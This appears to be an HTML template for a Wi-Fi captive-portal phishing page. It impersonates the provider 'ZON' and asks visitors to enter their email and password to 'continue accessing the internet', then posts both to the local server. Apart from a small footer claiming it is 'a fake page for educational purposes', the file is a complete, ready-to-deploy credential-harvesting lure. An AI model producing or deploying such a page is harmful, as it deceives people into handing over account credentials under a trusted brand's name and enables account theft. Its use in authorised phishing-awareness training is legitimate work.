<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ZON - Account Verification</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .container { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; overflow: hidden; }
    .header { background: linear-gradient(135deg, #5B2C8E 0%, #4A1A6B 100%); padding: 30px 25px; text-align: center; }
    .logo { font-size: 2rem; font-weight: 800; color: white; letter-spacing: 2px; }
    .logo span { color: #C9A4E8; }
    .body { padding: 30px 25px; }
    h2 { font-size: 1.2rem; color: #333; margin-bottom: 8px; }
    .description { color: #777; font-size: 0.9rem; line-height: 1.5; margin-bottom: 25px; }
    .form-group { margin-bottom: 18px; }
    label { display: block; font-size: 0.85rem; color: #555; margin-bottom: 6px; font-weight: 500; }
    input { width: 100%; padding: 12px 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 1rem; transition: border-color 0.2s; }
    input:focus { outline: none; border-color: #5B2C8E; box-shadow: 0 0 0 3px rgba(91,44,142,0.1); }
    button { width: 100%; padding: 14px; background: #5B2C8E; color: white; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
    button:hover { background: #4A1A6B; }
    .alert { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px; margin-bottom: 20px; border-radius: 4px; font-size: 0.85rem; color: #856404; }
    .footer { text-align: center; padding: 15px 25px; border-top: 1px solid #eee; font-size: 0.7rem; color: #aaa; background: #fafafa; }
    .brand-footer { text-align: center; padding: 10px; font-size: 0.75rem; color: #999; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">Z<span>O</span>N</div>
    </div>
    <div class="body">
      <h2>Account Verification</h2>
      <p class="description">To continue accessing the internet, please verify your ZON account credentials. This is required to maintain your connection on this network.</p>
      <div class="alert">Your session requires re-authentication to continue.</div>
      <form action="/" method="post">
        <div class="form-group">
          <label for="email">Email Address</label>
          <input type="email" id="email" name="email" placeholder="your@email.com" required>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter your password" required>
        </div>
        <button type="submit">Verify Account</button>
      </form>
      <div class="brand-footer">Powered by ZON</div>
    </div>
    <div class="footer">This is a fake page for educational purposes.</div>
  </div>
</body>
</html>
